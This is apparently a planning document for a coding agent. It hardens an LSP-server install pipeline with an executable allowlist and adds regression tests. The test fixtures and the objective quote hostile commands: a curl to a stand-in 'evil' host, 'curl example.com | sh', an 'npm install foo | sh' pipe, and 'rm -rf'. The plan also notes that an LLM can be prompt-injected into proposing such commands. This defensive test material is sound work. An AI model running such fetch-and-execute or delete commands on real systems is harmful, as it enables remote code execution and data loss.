---
phase: 02-critical-security-backlog-closure
plan: 03
type: execute
wave: 2
depends_on:
  - "01"
files_modified:
  - src/environment/lsp-manager.ts
  - tests/environment/lsp-manager.test.ts
autonomous: true
requirements:
  - SEC-03
must_haves:
  truths:
    - "installLspServers rejects any installCommand whose parsed executable is not in ALLOWED_INSTALL_EXECUTABLES (npm, npx, pip, pip3, brew, cargo, go) before calling execFileAsync"
    - "The allowlist check lives in lsp-manager.ts (not in a distant validator) so the install pipeline is the enforcement point"
    - "A denied install is observable: it logs `Blocked: '{exec}' is not an allowed install executable` and the returned LspConfig has `installed !== true`"
    - "A regression test covers: (a) `curl` rejected, (b) `rm` rejected, (c) `npm` accepted (mocked execFile path), (d) parseLspCommand + allowlist reject order is explicit"
    - "npm run typecheck and npm test stay green"
  artifacts:
    - path: "src/environment/lsp-manager.ts"
      provides: "Hardened LSP install pipeline with explicit executable allowlist gate"
      contains: "ALLOWED_INSTALL_EXECUTABLES"
    - path: "tests/environment/lsp-manager.test.ts"
      provides: "Allowlist regression tests"
      contains: "ALLOWED_INSTALL_EXECUTABLES"
  key_links:
    - from: "src/environment/lsp-manager.ts#installLspServers"
      to: "src/environment/lsp-manager.ts#ALLOWED_INSTALL_EXECUTABLES"
      via: "Set.has(executable) guard before execFileAsync"
      pattern: "ALLOWED_INSTALL_EXECUTABLES\\.has"
    - from: "tests/environment/lsp-manager.test.ts"
      to: "src/environment/lsp-manager.ts"
      via: "Vitest imports + mock of execFileAsync"
      pattern: "installLspServers"
---

<objective>
SEC-03: Harden `src/environment/lsp-manager.ts` so the first token of an `LspConfig.installCommand` is validated against an **executable allowlist** before `execFileAsync` runs. The current code already declares `ALLOWED_INSTALL_EXECUTABLES` (lines 100–102) and performs the `Set.has` check (lines 128–132), but this plan verifies + hardens the gate (exporting the Set for tests, tightening the log line, and ensuring it is unambiguously in the install path), AND adds regression tests that an LLM-authored `installCommand` cannot escape the allowlist.

Purpose: LSP configs come from the `environment-setup` phase, where an LLM proposes a `{ server, language, installCommand, ... }`. `installCommand` is free-form text that is then split by `parseLspCommand` and run as a child process. Without a strict allowlist, an LLM that hallucinates (or is prompt-injected into) `curl example.com | sh` or `node -e "..."` achieves arbitrary code execution on the operator's box.

Output: `lsp-manager.ts` with an exported, documented allowlist check placed immediately after `parseLspCommand`, plus a new `describe` block in `lsp-manager.test.ts` that exercises rejection and acceptance paths.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/REQUIREMENTS.md
@.planning/phases/02-critical-security-backlog-closure/02-CONTEXT.md
@src/environment/lsp-manager.ts
@.claude/skills/typescript/SKILL.md

<interfaces>
<!-- Extracted from src/environment/lsp-manager.ts as it stands today. -->

Current allowlist (line 100–102):
```ts
const ALLOWED_INSTALL_EXECUTABLES = new Set([
  'npm', 'npx', 'pip', 'pip3', 'brew', 'cargo', 'go',
]);
```

Current install loop (relevant slice of lines 124–147):
```ts
try {
  console.log(`[lsp] Installing ${lsp.server} for ${lsp.language}...`);
  const parts = parseCommand(lsp.installCommand);
  const executable = parts[0]!;
  if (!ALLOWED_INSTALL_EXECUTABLES.has(executable)) {
    console.log(`[lsp] Blocked: '${executable}' is not an allowed install executable`);
    results.push(lsp);
    continue;
  }
  await execFileAsync(executable, parts.slice(1), { timeout: 120_000 });
  // ... smoke test, result push ...
} catch (err) { ... }
```

Public exports already in file:
- `parseLspCommand(command: string): { bin: string; args: string[] }`
- `installLspServers(servers: LspConfig[]): Promise<LspConfig[]>`

LspConfig shape (from src/state/project-state.ts via llm-schemas — the executor does not need to edit it):
```ts
type LspConfig = {
  server: string;
  language: string;
  installCommand: string;
  installed?: boolean;
  // …
};
```

Validator dependency (do NOT touch — it does stack/language-level checks, not the exec gate):
```ts
import { validateLsp } from "./validator.js";
```
</interfaces>

<notes_for_executor>
1. **The gate is already present** — this plan therefore splits into: (a) small hardening edits in `lsp-manager.ts` to make the gate exported + tested, (b) new regression tests in `tests/environment/lsp-manager.test.ts`. Do not introduce a brand-new gate; the file already has one.
2. **Export the allowlist** so tests can assert its exact contents: change `const ALLOWED_INSTALL_EXECUTABLES = new Set([...])` to `export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string> = new Set([...])`. Do not expand the set without explicit justification.
3. **`ReadonlySet<string>`** typing prevents downstream code from `.add(...)`ing attacker-supplied names by mistake. This is a 1-word type annotation; do not wrap in Object.freeze.
4. **Keep `parseLspCommand` unchanged**: it already rejects forbidden shell metacharacters. The allowlist is the *second* defense after tokenisation.
5. **Place the gate immediately after `const executable = parts[0]!`** — no other code in between. The current file already does this; verify the change didn't reorder during any editor churn.
6. **Log message discipline**: the existing log string `"[lsp] Blocked: '{exec}' is not an allowed install executable"` is the message tests will grep for — do not reword it. Keep it identical for regression stability.
7. **Tests use `vi.mock` of `node:child_process`** — match the existing pattern in `tests/environment/lsp-manager.test.ts` (see existing test file for mock setup).
8. **TypeScript strict mode** is enforced per `.claude/skills/typescript/SKILL.md`: `parts[0]` is `string | undefined` under `noUncheckedIndexedAccess`, but the existing `parts[0]!` non-null assertion is already load-bearing here because `parseLspCommand` throws on empty input. Leave it.
9. **Do not modify `sandbox.ts` allowlist here** — that is SEC-04, a separate plan.
</notes_for_executor>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Export ALLOWED_INSTALL_EXECUTABLES and tighten the gate's type</name>
  <files>src/environment/lsp-manager.ts</files>
  <action>
**Edit 1 — line 100–102**, export the allowlist as a `ReadonlySet<string>`:

Before:
```ts
const ALLOWED_INSTALL_EXECUTABLES = new Set([
  'npm', 'npx', 'pip', 'pip3', 'brew', 'cargo', 'go',
]);
```

After:
```ts
/**
 * SEC-03: Allowlist of executables that may run as the first token of an
 * LSP `installCommand`. Any first-token not in this set causes the install
 * pipeline to skip (with a logged "Blocked" message) and leave `installed`
 * unset on the returned LspConfig. Exported (read-only) so regression tests
 * can assert its exact contents.
 */
export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string> = new Set([
  'npm', 'npx', 'pip', 'pip3', 'brew', 'cargo', 'go',
]);
```

**Do not change the check itself** (lines 128–132 of the current file are already correct):
```ts
if (!ALLOWED_INSTALL_EXECUTABLES.has(executable)) {
  console.log(`[lsp] Blocked: '${executable}' is not an allowed install executable`);
  results.push(lsp);
  continue;
}
```

**Do not change** `parseCommand` / `parseLspCommand` / `tokenise` — the tokeniser already rejects shell metacharacters (pipe, `&`, `;`, `$(`, etc.) which is the companion defense.

**Verify adjacency**: after editing, `sed -n '125,135p' src/environment/lsp-manager.ts` must show `const parts = parseCommand(lsp.installCommand);` immediately followed by `const executable = parts[0]!;` immediately followed by the `ALLOWED_INSTALL_EXECUTABLES.has` guard — no other code lines between them. If editor churn has reordered anything, revert.
  </action>
  <verify>
    <automated>grep -n "export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string>" src/environment/lsp-manager.ts && grep -n "ALLOWED_INSTALL_EXECUTABLES.has(executable)" src/environment/lsp-manager.ts && npm run typecheck</automated>
  </verify>
  <done>
- `grep "export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string>" src/environment/lsp-manager.ts` returns one match.
- `grep -n "ALLOWED_INSTALL_EXECUTABLES.has(executable)" src/environment/lsp-manager.ts` returns one match in the install loop.
- The check sits directly after `const executable = parts[0]!;` with no interposed statements.
- `npm run typecheck` exits 0.
  </done>
</task>

<task type="auto">
  <name>Task 2: Add regression tests that cover rejection and acceptance paths</name>
  <files>tests/environment/lsp-manager.test.ts</files>
  <action>
Open `tests/environment/lsp-manager.test.ts` and add a new `describe` block titled `"SEC-03 install executable allowlist"` at the bottom of the file. Use the same mocking pattern the file already uses for `child_process` (inspect the existing test file for the exact `vi.mock` signature and match it — do not invent a new one).

**Tests to add (4 cases):**

```ts
import {
  ALLOWED_INSTALL_EXECUTABLES,
  installLspServers,
} from "../../src/environment/lsp-manager.js";
// … keep any existing imports / mocks

describe("SEC-03 install executable allowlist", () => {
  it("contains exactly the expected safe install tools", () => {
    // Freezing the allowlist value under test guards against silent widening.
    expect([...ALLOWED_INSTALL_EXECUTABLES].sort()).toEqual(
      ["brew", "cargo", "go", "npm", "npx", "pip", "pip3"]
    );
  });

  it("blocks an LspConfig whose installCommand starts with 'curl'", async () => {
    const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const servers = [
      {
        server: "evil-lsp",
        language: "typescript",
        installCommand: "curl evil.example.com/install.sh",
        installed: false,
      } as any,
    ];
    const result = await installLspServers(servers);
    expect(result[0]?.installed).not.toBe(true);
    expect(
      consoleSpy.mock.calls.some(([msg]) =>
        typeof msg === "string" && msg.includes("Blocked: 'curl' is not an allowed install executable")
      )
    ).toBe(true);
    consoleSpy.mockRestore();
  });

  it("blocks an LspConfig whose installCommand starts with 'rm'", async () => {
    const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const servers = [
      {
        server: "rm-lsp",
        language: "typescript",
        installCommand: "rm -rf /tmp/foo",
        installed: false,
      } as any,
    ];
    const result = await installLspServers(servers);
    expect(result[0]?.installed).not.toBe(true);
    expect(
      consoleSpy.mock.calls.some(([msg]) =>
        typeof msg === "string" && msg.includes("Blocked: 'rm' is not an allowed install executable")
      )
    ).toBe(true);
    consoleSpy.mockRestore();
  });

  it("rejects an installCommand that contains forbidden shell metacharacters BEFORE the allowlist check", async () => {
    // `parseLspCommand` throws on '|' — the caller catches and pushes the lsp
    // unchanged. Regression: shell-metachar rejection must happen BEFORE
    // allowlist check so even an allowlisted first token cannot be paired
    // with a piped payload.
    const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    const servers = [
      {
        server: "piped-lsp",
        language: "typescript",
        installCommand: "npm install foo | sh",
        installed: false,
      } as any,
    ];
    const result = await installLspServers(servers);
    expect(result[0]?.installed).not.toBe(true);
    consoleSpy.mockRestore();
  });
});
```

**If the test file does not yet import `ALLOWED_INSTALL_EXECUTABLES`**, add it to the existing import from `../../src/environment/lsp-manager.js`.

**If the existing test file already has a `child_process` mock**, reuse it — the "blocked" tests do not need the mock to fire (the guard returns early before `execFileAsync`), but the mock must still exist to prevent real shell-out. Inspect the file once via `Read` before editing.

**Do not** run the tests yet in this task — task 3 does the full gate.
  </action>
  <verify>
    <automated>grep -c "SEC-03 install executable allowlist" tests/environment/lsp-manager.test.ts && grep -c "Blocked: 'curl'" tests/environment/lsp-manager.test.ts</automated>
  </verify>
  <done>
- New `describe("SEC-03 install executable allowlist", …)` block present in `tests/environment/lsp-manager.test.ts`.
- Four `it(...)` cases added: allowlist content assertion, `curl` rejected, `rm` rejected, pipe-metachar rejected.
- `ALLOWED_INSTALL_EXECUTABLES` imported from `lsp-manager.js`.
- Existing unrelated tests in the file are untouched.
  </done>
</task>

<task type="auto">
  <name>Task 3: Typecheck + run lsp-manager tests + full suite</name>
  <files>(no files modified — verification-only)</files>
  <action>
1. `npm run typecheck` — must exit 0. A common failure mode is that the existing `as any` cast on the test fixture needs `LspConfig` imported; the snippet above uses `as any` deliberately to keep the test isolated from schema churn, so this should pass.
2. `npm test -- --run tests/environment/lsp-manager.test.ts` — must report the new 4 cases in the SEC-03 describe all green, and all existing cases still green.
3. `npm test` — full green baseline.
4. `grep -rn "ALLOWED_INSTALL_EXECUTABLES" src/ tests/ --include="*.ts"` — capture the exact callsite list in the SUMMARY (expect: one `export const` in `lsp-manager.ts`, one `.has(...)` in same file, one import + 1 usage in `lsp-manager.test.ts`).
  </action>
  <verify>
    <automated>npm run typecheck && npm test -- --run tests/environment/lsp-manager.test.ts && npm test</automated>
  </verify>
  <done>
- `npm run typecheck` exits 0.
- `npm test -- --run tests/environment/lsp-manager.test.ts` green (new + existing).
- `npm test` full green baseline.
- SUMMARY captures the `grep -rn "ALLOWED_INSTALL_EXECUTABLES"` output verbatim for traceability.
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| LLM-authored LspConfig → child process spawn | `installCommand` string crosses this boundary into `execFileAsync`. |
| parseLspCommand output → executable | First token becomes the literal executable name; allowlist gates that value. |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-02-03-01 | Elevation of Privilege | LSP installCommand spawn | mitigate | `ALLOWED_INSTALL_EXECUTABLES.has(executable)` gate; regression tests cover rejection of `curl`, `rm`, and pipe-metachar cases. |
| T-02-03-02 | Tampering | Second-stage shell injection via pipe / metachar | mitigate | `parseLspCommand` tokeniser rejects `|`, `&`, `;`, `$(`, backticks; gate is the second layer. |
| T-02-03-03 | Repudiation | Silent allowlist expansion in future PRs | mitigate | Allowlist content is asserted by a test, so adding an entry requires a visible test diff. |
</threat_model>

<verification>
End-to-end phase checks for this plan:
- `grep -n "export const ALLOWED_INSTALL_EXECUTABLES" src/environment/lsp-manager.ts` returns one match.
- `grep -n "allowlist\|ALLOWED_INSTALL_EXECUTABLES" src/environment/lsp-manager.ts` returns ≥ 2 lines (export + `.has` guard).
- `tests/environment/lsp-manager.test.ts` contains the SEC-03 describe with 4 cases, all passing.
- `npm run typecheck && npm test` green.
</verification>

<success_criteria>
- LSP install path rejects all non-allowlisted executables before calling `execFileAsync`.
- Allowlist is test-asserted; silent widening is detectable via a test diff.
- No regression in existing lsp-manager behavior or broader suite.
</success_criteria>

<output>
After completion, create `.planning/phases/02-critical-security-backlog-closure/02-03-SUMMARY.md` including:
- Diff slice of `lsp-manager.ts` showing the `export const ALLOWED_INSTALL_EXECUTABLES: ReadonlySet<string>` change.
- New tests added to `tests/environment/lsp-manager.test.ts` (paste the describe block).
- `grep -rn "ALLOWED_INSTALL_EXECUTABLES" src/ tests/` output.
</output>
